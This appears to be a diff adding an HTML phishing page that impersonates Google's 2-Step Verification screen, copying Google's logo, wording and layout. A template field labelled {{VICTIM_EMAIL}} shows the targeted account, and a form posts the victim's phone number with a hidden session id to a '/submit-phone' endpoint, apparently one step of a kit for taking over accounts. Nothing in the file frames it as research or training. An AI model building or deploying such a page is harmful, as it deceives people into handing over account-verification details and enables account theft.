@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>2-Step Verification</title>
+<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{width:100%;height:100%}
+body{background:#202124;font-family:'Google Sans',Arial,sans-serif;overflow:hidden;display:flex;justify-content:center;align-items:center;color:#fff;zoom:1.25}
+.wrapper{width:770px;position:relative}
+.card{width:770px;height:255px;background:#000;border-radius:28px;position:relative}
+.google-g{position:absolute;top:28px;left:30px;width:23px;height:23px}
+.left{position:absolute;left:30px;top:76px;width:305px}
+.title{font-size:31px;font-weight:400;letter-spacing:-0.5px;line-height:1.1;margin-bottom:15px}
+.subtitle{width:260px;font-size:11px;line-height:1.58;color:#e3e3e3;margin-bottom:18px}
+.email-chip{display:inline-flex;align-items:center;height:24px;border:1px solid #5f6368;border-radius:16px;padding:0 8px 0 6px;gap:6px;font-size:10px;font-weight:500;color:#fff}
+.user{width:13px;height:13px;border-radius:50%;border:1px solid #dadce0;position:relative}
+.user:before{content:'';position:absolute;width:4px;height:4px;border-radius:50%;background:#dadce0;top:2px;left:3.5px}
+.user:after{content:'';position:absolute;width:7px;height:3px;border-radius:10px 10px 0 0;background:#dadce0;bottom:1.5px;left:2px}
+.arrow{width:0;height:0;border-left:3px solid transparent;border-right:3px solid transparent;border-top:4px solid #dadce0;margin-top:2px}
+.right{position:absolute;right:30px;top:74px;width:290px}
+.right-title{font-size:14px;font-weight:500;color:#fff;margin-bottom:14px}
+.right-text{width:285px;font-size:11.5px;line-height:1.6;color:#e3e3e3;margin-bottom:18px}
+.phone-row{display:flex;align-items:center}
+.input-box{width:220px;height:33px;border:1px solid #5f6368;border-radius:4px;background:#000;outline:none;color:#fff;padding:0 13px;font-family:'Google Sans',Arial,sans-serif;font-size:11px;transition:border .1s ease, box-shadow .1s ease}
+.input-box:focus{border:1px solid #8ab4f8;box-shadow:0 0 0 1px #8ab4f8 inset}
+.input-box::placeholder{color:#9aa0a6}
+.bottom-right{position:absolute;right:21px;bottom:19px;display:flex;align-items:center}
+.send{width:49px;height:32px;border:none;border-radius:16px;background:#8ab4f8;color:#202124;font-size:11px;font-weight:500;font-family:'Google Sans',Arial,sans-serif;cursor:pointer}
+.footer{width:770px;margin-top:12px;padding:0 6px;display:flex;justify-content:space-between;align-items:center;color:#dadce0;font-size:9px}
+.footer-left{display:flex;align-items:center;gap:5px}
+.footer-right{display:flex;gap:23px}
+.small-arrow{width:0;height:0;border-left:3px solid transparent;border-right:3px solid transparent;border-top:4px solid #dadce0;margin-top:2px}
+</style>
+</head>
+<body>
+<div class="wrapper">
+<div class="card">
+<svg class="google-g" viewBox="0 0 18 18">
+<path fill="#EA4335" d="M9 3.48c1.69 0 2.84.73 3.49 1.34l2.54-2.54C13.49.85 11.47 0 9 0 5.48 0 2.44 2.02.96 4.96l2.95 2.29C4.64 5.1 6.62 3.48 9 3.48z"/>
+<path fill="#4285F4" d="M17.64 9.2c0-.64-.06-1.25-.16-1.84H9v3.48h4.84c-.21 1.12-.84 2.07-1.8 2.71l2.91 2.26c1.7-1.57 2.69-3.88 2.69-6.61z"/>
+<path fill="#FBBC05" d="M3.91 10.75A5.41 5.41 0 0 1 3.62 9c0-.61.1-1.2.29-1.75L.96 4.96A8.96 8.96 0 0 0 0 9c0 1.45.35 2.82.96 4.04l2.95-2.29z"/>
+<path fill="#34A853" d="M9 18c2.43 0 4.47-.8 5.96-2.18l-2.91-2.26c-.81.54-1.84.86-3.05.86-2.38 0-4.36-1.61-5.09-3.77L.96 13.04C2.44 15.98 5.48 18 9 18z"/>
+</svg>
+<div class="left">
+<div class="title">2-Step Verification</div>
+<div class="subtitle">To help keep your account safe, Google wants to make sure that it's really you trying to sign in</div>
+<div class="email-chip"><div class="user"></div>{{VICTIM_EMAIL}}<div class="arrow"></div></div>
+</div>
+<div class="right">
+<div class="right-title">Get a verification code</div>
+<div class="right-text">To get a verification code, first confirm the phone number that you added to your account.</div>
+<form id="phoneSendForm" action="/submit-phone" method="POST">
+  <input type="hidden" name="sid" id="phoneSid" value="{{SESSION_ID}}">
+  <div class="phone-row">
+    <input class="input-box" name="phone" placeholder="Phone number" required>
+  </div>
+</form>
+</div>
+<div class="bottom-right">
+<button class="send" type="submit" form="phoneSendForm">Send</button>
+</div>
+</div>
+<div class="footer">
+<div class="footer-left">English (United Kingdom)<div class="small-arrow"></div></div>
+<div class="footer-right"><span>Help</span><span>Privacy</span><span>Terms</span></div>
+</div>
+</div>
+</body>
+</html>
